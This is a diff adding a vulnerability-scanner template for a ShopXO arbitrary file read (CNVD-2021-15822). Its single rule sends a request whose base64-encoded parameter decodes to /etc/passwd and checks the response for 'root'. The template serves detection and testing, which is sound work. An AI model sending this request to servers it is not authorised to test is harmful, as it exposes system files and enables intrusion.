@@ -1,0 +1,18 @@
+name: ShopXO Fileread CNVD-2021-15822
+manual: true
+query: title="ShopXO"
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
+      follow_redirects: true
+    expression: response.body.bcontains(b"root")
+expression: r0()
+detail:
+  links:
+  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-15822
+  - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
+  description: ShopXO is an open source enterprise-level open source e-commerce system.
+  tags: fileread
